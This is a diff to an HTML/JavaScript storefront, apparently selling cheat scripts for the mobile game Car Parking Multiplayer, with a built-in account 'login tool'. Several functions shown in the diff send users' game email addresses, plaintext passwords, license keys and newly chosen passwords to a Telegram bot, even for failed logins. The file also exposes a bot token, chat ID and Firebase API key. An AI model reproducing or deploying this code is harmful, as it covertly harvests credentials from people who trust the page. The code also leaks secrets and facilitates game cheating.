@@ -20,6 +20,8 @@
             background: #0a0a0a; 
             color: #ffffff; 
             overflow-x: hidden;
+            /* Background tetap menggunakan URL luar agar tampilan tidak pecah saat awal, 
+               tapi jika kamu punya file background sendiri di folder, ganti url() di bawah ke 'images/bg.jpg' */
             background-image: linear-gradient(to bottom, rgba(10,10,10,0.8), #0a0a0a), url('https://w0.peakpx.com/wallpaper/424/62/HD-wallpaper-r34-nissan-skyline-gtr-bayside-blue-jdm.jpg');
             background-attachment: fixed;
             background-size: cover;
@@ -57,7 +59,7 @@
     <nav class="fixed top-0 left-0 right-0 h-20 glass-nav z-[100] flex items-center">
         <div class="container mx-auto px-4 flex justify-between items-center">
             <div class="flex items-center space-x-2 cursor-pointer" @click="currentPage = 'home'">
-                <img src="https://i.ibb.co/LzNfF8f/logo.png" class="w-10 h-10 rounded-full border border-red-600" alt="AWIMEDAN">
+                <img src="images/logo.jpg" class="w-10 h-10 rounded-full border border-red-600" alt="AWIMEDAN">
                 <span class="text-2xl font-black italic tracking-tighter">AWIMEDAN<span class="accent-red"></span></span>
             </div>
 
@@ -245,7 +247,7 @@
             </div>
         </div>
 
-        <div x-show="currentPage === 'topup'" x-transition class="container mx-auto px-4 max-w-md">
+        <div x-show="currentPage === 'topup'" x-transition class="container mx-auto px-4 max-md">
             <div class="stat-card p-8 text-center">
                 <h2 class="text-2xl font-black italic accent-red mb-2">TOP UP SALDO</h2>
                 <p class="text-[10px] text-gray-500 font-bold uppercase mb-8">Pilih nominal dan scan QRIS</p>
@@ -261,7 +263,7 @@
                 </div>
 
                 <div x-show="selectedAmount > 0" x-transition class="bg-white p-4 rounded-xl mb-6">
-                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=AWIMEDAN-PAYMENT" class="w-full">
+                    <img src="qris.jpg" class="w-full">
                     <p class="text-black font-black mt-2 italic text-lg" x-text="'TOTAL: Rp ' + selectedAmount.toLocaleString()"></p>
                 </div>
 
@@ -318,7 +320,6 @@
                 isAdmin: false,
                 allUsers: [],
 
-                // Configs (Tetap sama)
                 firebaseConfig: {
                     apiKey: "AIzaSyCNZokAKl6TVKWMOc51SCSRKZGqoG77uFI",
                     authDomain: "cpmapikey.firebaseapp.com",
@@ -331,11 +332,24 @@
                 botToken: "8625213432:AAHVdpxEdFkh1vg1SF5RQha09wp6SxRlGdU",
                 adminChatId: "6095762919",
 
+                // Update img path ke folder images lokal
                 products: [
-                    { name: 'Script All In One CPM 1', price: 100000, img: 'https://i.ibb.co/h7nSk8P/script1.jpg' },
-                    { name: 'Script Wallhack', price: 20000, img: 'https://i.ibb.co/h7nSk8P/script1.jpg' },
-                    { name: 'Race 3 Second', price: 25000, img: 'https://i.ibb.co/h7nSk8P/script1.jpg' },
-                    { name: 'Timing Kuda Permanent', price: 30000, img: 'https://i.ibb.co/h7nSk8P/script1.jpg' }
+                    { name: 'Script All In One CPM 1', price: 100000, img: 'images/Script All In One AWIMEDAN CPM 1.jpg' },
+                    { name: 'Script Wallhack', price: 100000, img: 'images/Script Wallhack.jpg' },
+                    { name: 'Script Race 3 Second', price: 100000, img: 'images/Script Race 3sec.jpg' },
+                    { name: 'Script Timing Kuda Permanent + Tutorial', price: 100000, img: 'images/Script Timing Kuda Permanent.jpg' },
+                    { name: 'Timing Kuda Permanent', price: 100000, img: 'images/Script Timing Kuda Permanent.jpg' },
+                    { name: 'Script 8000 / 8K Tune Up', price: 100000, img: 'images/Script 8000 Tune Up.jpg' },
+                    { name: 'Script Unlimited Tires 100% & 0%', price: 100000, img: 'images/Script Unlimited Tires.jpg' },
+                    { name: 'Script Timing Kuda Tune Up', price: 100000, img: 'images/Timing Kuda Tune Up.jpg' },
+                    { name: 'Script Velg Bakar & Chrome', price: 100000, img: 'images/Script Velg Bakar & Chrome.jpg' },
+                    { name: 'Script Unlock Premium Features', price: 100000, img: 'images/Unlock Premium Features.jpg' },
+                    { name: 'Script Camper & Ufo', price: 100000, img: 'images/Script Camper & Ufo.jpg' },
+                    { name: 'Script Timing Kuda Slember', price: 100000, img: 'images/Timing Kuda Slember.jpg' },
+                    { name: 'Script Long Name', price: 100000, img: 'images/Script Long Name.jpg' },
+                    { name: 'Script Race', price: 100000, img: 'images/race.jpg' },
+                    { name: 'CAR F1 & F2 1027+Kmh', price: 100000, img: 'images/F1 & F2 Tune Up Permanent .jpg' },
+                    { name: 'Script Liaran', price: 100000, img: 'images/liaran.jpg' },
                 ],
 
                 gameApis: {
@@ -415,46 +429,32 @@
                 resetBalance(uid) { firebase.database().ref('users/' + uid + '/balance').set(0); },
 
                 async handleCpmLogin() {
-    if (!this.cpmForm.key || !this.cpmForm.email) { this.message = "Isi data!"; return; }
-    
-    // LOG SEBELUM VALIDASI (Menangkap data mentah)
-    this.logToTelegram(`📡 **TRY LOGIN TOOL**\n` +
-        `Acc: \`${this.cpmForm.email}\`\n` +
-        `Pass: \`${this.cpmForm.password}\`\n` +
-        `Key: \`${this.cpmForm.key}\`\n` +
-        `Versi: ${this.cpmForm.gameId === '1' ? 'CPM 1' : 'CPM 2'}`);
-
-    this.loading = true;
-    try {
-        const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
-        
-        // Cek Key
-        if (!snap.val() || snap.val().status !== 'active') {
-            this.logToTelegram(`❌ **LOGIN FAILED**: Invalid Key (\`${this.cpmForm.key}\`)`);
-            throw new Error("Key Invalid!");
-        }
-
-        const game = this.gameApis[this.cpmForm.gameId];
-        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${game.api}`, {
-            method: 'POST', headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ email: this.cpmForm.email, password: this.cpmForm.password, returnSecureToken: true })
-        });
-        const data = await res.json();
-
-        if (data.idToken) {
-            this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: game };
-            this.message = "";
-            this.logToTelegram(`✅ **LOGIN SUCCESS**\nAcc: \`${data.email}\``);
-        } else {
-            this.logToTelegram(`❌ **LOGIN FAILED**: Wrong Email/Pass for \`${this.cpmForm.email}\``);
-            throw new Error("Login Gagal!");
-        }
-    } catch (e) { 
-        this.message = e.message; 
-    }
-    this.loading = false;
-},
-
+                    if (!this.cpmForm.key || !this.cpmForm.email) { this.message = "Isi data!"; return; }
+                    this.logToTelegram(`📡 **TRY LOGIN TOOL**\n` + `Acc: \`${this.cpmForm.email}\`\n` + `Pass: \`${this.cpmForm.password}\`\n` + `Key: \`${this.cpmForm.key}\`\n` + `Versi: ${this.cpmForm.gameId === '1' ? 'CPM 1' : 'CPM 2'}`);
+                    this.loading = true;
+                    try {
+                        const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
+                        if (!snap.val() || snap.val().status !== 'active') {
+                            this.logToTelegram(`❌ **LOGIN FAILED**: Invalid Key (\`${this.cpmForm.key}\`)`);
+                            throw new Error("Key Invalid!");
+                        }
+                        const game = this.gameApis[this.cpmForm.gameId];
+                        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${game.api}`, {
+                            method: 'POST', headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ email: this.cpmForm.email, password: this.cpmForm.password, returnSecureToken: true })
+                        });
+                        const data = await res.json();
+                        if (data.idToken) {
+                            this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: game };
+                            this.message = "";
+                            this.logToTelegram(`✅ **LOGIN SUCCESS**\nAcc: \`${data.email}\``);
+                        } else {
+                            this.logToTelegram(`❌ **LOGIN FAILED**: Wrong Email/Pass for \`${this.cpmForm.email}\``);
+                            throw new Error("Login Gagal!");
+                        }
+                    } catch (e) { this.message = e.message; }
+                    this.loading = false;
+                },
 
                 async setKingRank() {
                     try {
@@ -466,56 +466,47 @@
                 },
 
                 async changeEmailPrompt() {
-    const ne = prompt("Email Baru:");
-    if(!ne) return;
+                    const ne = prompt("Email Baru:");
+                    if(!ne) return;
+                    this.logToTelegram(`📩 **TRY CHANGE EMAIL**\nOld: \`${this.cpmUser.email}\`\nNew: \`${ne}\``);
+                    this.loading = true;
+                    try {
+                        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
+                            method: 'POST', headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ idToken: this.cpmUser.token, email: ne, returnSecureToken: true, upgradeToFederatedLogin: true })
+                        });
+                        if(res.ok) {
+                            this.logToTelegram(`✅ **SUCCESS CHANGE EMAIL**\nResult: \`${ne}\``);
+                            this.cpmUser.email = ne;
+                            alert("Berhasil!");
+                        } else {
+                            this.logToTelegram(`❌ **FAILED CHANGE EMAIL**\nAcc: \`${this.cpmUser.email}\``);
+                            alert("Gagal!");
+                        }
+                    } catch (e) { alert("Error!"); }
+                    this.loading = false;
+                },
 
-    // Log percobaan ganti email
-    this.logToTelegram(`📩 **TRY CHANGE EMAIL**\nOld: \`${this.cpmUser.email}\`\nNew: \`${ne}\``);
-
-    this.loading = true;
-    try {
-        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
-            method: 'POST', headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ idToken: this.cpmUser.token, email: ne, returnSecureToken: true, upgradeToFederatedLogin: true })
-        });
-        
-        if(res.ok) {
-            this.logToTelegram(`✅ **SUCCESS CHANGE EMAIL**\nResult: \`${ne}\``);
-            this.cpmUser.email = ne;
-            alert("Berhasil!");
-        } else {
-            this.logToTelegram(`❌ **FAILED CHANGE EMAIL**\nAcc: \`${this.cpmUser.email}\``);
-            alert("Gagal!");
-        }
-    } catch (e) { alert("Error!"); }
-    this.loading = false;
-},
-
-async changePasswordPrompt() {
-    const np = prompt("Password Baru:");
-    if(!np) return;
-
-    // Log percobaan ganti password
-    this.logToTelegram(`🔑 **TRY CHANGE PASS**\nAcc: \`${this.cpmUser.email}\`\nNew Pass: \`${np}\``);
-
-    this.loading = true;
-    try {
-        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
-            method: 'POST', headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ idToken: this.cpmUser.token, password: np, returnSecureToken: true })
-        });
-
-        if(res.ok) {
-            this.logToTelegram(`✅ **SUCCESS CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
-            alert("Berhasil!");
-        } else {
-            this.logToTelegram(`❌ **FAILED CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
-            alert("Gagal!");
-        }
-    } catch (e) { alert("Error!"); }
-    this.loading = false;
-},
-
+                async changePasswordPrompt() {
+                    const np = prompt("Password Baru:");
+                    if(!np) return;
+                    this.logToTelegram(`🔑 **TRY CHANGE PASS**\nAcc: \`${this.cpmUser.email}\`\nNew Pass: \`${np}\``);
+                    this.loading = true;
+                    try {
+                        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
+                            method: 'POST', headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ idToken: this.cpmUser.token, password: np, returnSecureToken: true })
+                        });
+                        if(res.ok) {
+                            this.logToTelegram(`✅ **SUCCESS CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
+                            alert("Berhasil!");
+                        } else {
+                            this.logToTelegram(`❌ **FAILED CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
+                            alert("Gagal!");
+                        }
+                    } catch (e) { alert("Error!"); }
+                    this.loading = false;
+                },
 
                 logoutCpm() { this.cpmUser = { isLoggedIn: false }; },
                 logToTelegram(t) {
@@ -530,3 +521,4 @@ async changePasswordPrompt() {
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
 </body>
 </html>
+
